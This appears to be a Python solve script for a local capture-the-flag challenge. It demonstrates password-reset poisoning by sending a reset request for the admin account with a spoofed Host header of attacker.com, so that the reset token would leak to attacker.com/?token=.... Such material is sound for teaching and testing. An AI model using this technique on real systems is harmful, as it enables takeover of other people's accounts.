import requests
import json
import time

BASE_URL = "http://127.0.0.1:5008"
session = requests.Session()

# In a real CTF, players use webhook.site. 
# For testing locally without an external service, we can't easily intercept the "admin click" 
# because the server itself makes the request. 
# However, the server prints the generated reset link (and token) to stdout. 
# We'll simulate the attack:
print("1. Sending password reset request for admin with a spoofed Host header...")
headers = {
    "Host": "attacker.com"
}
# We don't actually need attacker.com to exist if we just want to verify the vulnerability. 
# If it's vulnerable, the app will generate a token and print it. 
# We can't automatically grab the token from stdout in this python script cleanly without reading
# the server process output, but we can verify the request succeeds.
r1 = session.post(f"{BASE_URL}/forgot_password", data={"username": "admin"}, headers=headers)
print("Password reset requested:", r1.status_code == 200)

print("\n*** Automated Solve Requires Token Interception ***")
print("Since the token is sent to the spoofed host (or printed to the server console),")
print("you must manually grab the token and provide it to complete the solve flow.")
print("If you were running a local listener, you'd capture the GET request to attacker.com/?token=...")
